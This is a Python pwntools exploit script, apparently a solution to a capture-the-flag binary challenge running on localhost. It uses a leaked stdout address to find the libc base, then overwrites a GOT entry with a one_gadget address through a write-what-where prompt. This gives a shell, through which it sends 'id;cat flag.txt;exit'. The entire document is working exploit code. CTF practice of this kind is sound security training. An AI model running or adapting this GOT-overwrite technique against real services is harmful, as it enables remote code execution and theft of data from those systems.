import subprocess

from pwn import *

HOST = "localhost"
PORT = 12312


def get_one_gadget(filename):
    return list(map(
        int,
        subprocess.check_output(['one_gadget', '--raw', filename]).split(b' ')
    ))


def exploit():
    offset = 0x16b8

    libc = ELF("./libc.so.6")
    stdout_libc = libc.sym["_IO_2_1_stdout_"]
    log.info("stdout_libc: 0x%08x" % stdout_libc)

    # one gadget RCE offsets
    one_gadgets = get_one_gadget('./libc.so.6')
    log.info("one gadget RCE offsets: %s" % str(one_gadgets))

    target = remote(HOST, PORT)

    target.recvuntil("Here's stdout:\n")
    buf = target.recvline().strip()
    stdout = int(buf, 16)

    log.info("stdout: 0x%08x" % stdout)

    libc_base = stdout - stdout_libc
    log.info("libc_base: 0x%08x" % libc_base)

    got_entry = stdout - offset
    one_gadget_libc = libc_base + one_gadgets[2]

    log.info("got_entry: 0x%08x" % got_entry)
    log.info("one_gadget: 0x%08x" % one_gadget_libc)

    target.recvuntil("do you want to write?\n")
    target.sendline('8')
    target.recvuntil("Where do you want to write?\n")
    target.send(str(got_entry))
    target.recvuntil("What do you want to write?\n")
    target.sendline(p64(one_gadget_libc))
    target.sendline("id;cat flag.txt;exit")

    buf = target.recvall()
    if b"uid" in buf:
        log.success(buf.decode())
    else:
        log.failure(buf.decode())


if __name__ == "__main__":
    exploit()